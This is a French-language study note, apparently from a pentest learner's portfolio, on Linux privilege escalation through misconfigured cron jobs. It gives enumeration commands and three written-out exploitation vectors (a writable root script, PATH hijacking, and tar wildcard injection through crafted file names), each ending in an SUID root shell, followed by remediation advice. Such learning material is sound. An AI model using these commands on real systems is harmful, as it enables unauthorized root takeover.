# Tâches cron — Élévation de privilèges

## Définition

Les tâches cron s'exécutent automatiquement selon un calendrier, souvent
avec des droits élevés (root). Si un script exécuté par cron est modifiable
par un utilisateur non privilégié, ce dernier peut y injecter du code
qui s'exécutera avec les droits de root au prochain déclenchement.

---

## Énumération

```bash
# Crontab système
cat /etc/crontab

# Dossiers cron additionnels
ls -la /etc/cron*
cat /etc/cron.d/* 2>/dev/null

# Crontab de l'utilisateur courant
crontab -l

# Trouver les scripts potentiellement exécutés par cron
find / -name "*.sh" -type f 2>/dev/null

# Vérifier les permissions d'un script suspect
ls -la /chemin/vers/script.sh

# Processus root en cours (croise avec cron)
ps aux | grep root
```

Ce que chercher :
- Ligne dans `/etc/crontab` avec `root` et script dans `/home`, `/tmp`, `/opt`
- Commande sans chemin absolu (`tar`, `rm`, `cp`) → PATH hijacking possible
- Script `*.sh` dont le propriétaire n'est pas root ou qui est world-writable

---

## Vecteur 1 — Script cron modifiable

Si un script exécuté par root est inscriptible par l'utilisateur courant :

```bash
# Vérification
ls -la /chemin/script.sh
# Sortie : -rwxrwxr-x 1 root user /chemin/script.sh
# → group write et user = utilisateur courant → exploitable

# Injection
echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /chemin/script.sh
# Attendre le déclenchement cron, puis :
/tmp/bash -p
```

Rencontré en lab (pentest EvilCorp, VULN-03, CVSS 7.8) — voir le [rapport de pentest](https://github.com/Deagant/pentest-lab-report-portfolio).

---

## Vecteur 2 — PATH hijacking

Si `/etc/crontab` définit un `PATH` incluant un dossier contrôlable avant `/usr/bin`,
et que la tâche cron appelle une commande sans chemin absolu :

```
# Exemple vulnérable dans /etc/crontab
PATH=/home/user:/usr/local/sbin:/usr/bin:/bin
* * * * * root cleanup.sh
```

```bash
# Exploitation
echo '#!/bin/bash' > /home/user/cleanup.sh
echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /home/user/cleanup.sh
chmod +x /home/user/cleanup.sh
# Attendre le cron, puis :
/tmp/bash -p
```

---

## Vecteur 3 — Wildcard injection (tar)

Une commande cron utilisant un wildcard (`*`) peut être détournée via des noms de fichiers
spécialement conçus qui seront interprétés comme des arguments par le shell.

Exemple typique dans `/etc/crontab` :
```
* * * * * root cd /home/user/backup && tar czf /backup/archive.tgz *
```

```bash
# Exploitation via checkpoint-action de tar
echo "" > /home/user/backup/--checkpoint=1
echo "" > "/home/user/backup/--checkpoint-action=exec=sh exploit.sh"
echo '#!/bin/bash' > /home/user/backup/exploit.sh
echo 'cp /bin/bash /tmp/bash && chmod u+s /tmp/bash' >> /home/user/backup/exploit.sh
chmod +x /home/user/backup/exploit.sh
# tar expandera * en incluant les "fichiers" qui ressemblent à des options
```

Le wildcard `*` dans bash est expansé avant que tar ne reçoive ses arguments —
les fichiers nommés `--checkpoint=1` et `--checkpoint-action=...` deviennent des flags tar.

---

## Remédiations

- Auditer les permissions des scripts exécutés par cron (`ls -la`, `stat`)
- Aucun script cron root ne doit être modifiable par un utilisateur non root
- Utiliser des **chemins absolus** dans toutes les commandes cron
- Éviter les **wildcards** dans les commandes cron exposées
- Définir un `PATH` minimal et explicite dans `/etc/crontab`
- Vérifier régulièrement `/etc/crontab` et `/etc/cron.*` lors des audits de configuration
- Limiter les tâches cron root au strict minimum nécessaire

---

## Ce que j'ai appris

- Pourquoi un script cron modifiable est souvent le vecteur le plus rapide après sudo — il suffit d'attendre l'exécution
- La différence entre les 3 vecteurs : script modifiable (permissions), PATH hijacking (ordre PATH + chemin relatif), wildcard injection (expansion bash)
- L'expansion du wildcard se passe dans le shell avant tar — ce n'est pas un bug tar, c'est le comportement normal du shell qu'on détourne
- Pourquoi les chemins absolus et les wildcards doivent être traités comme des règles non négociables dans les scripts cron root
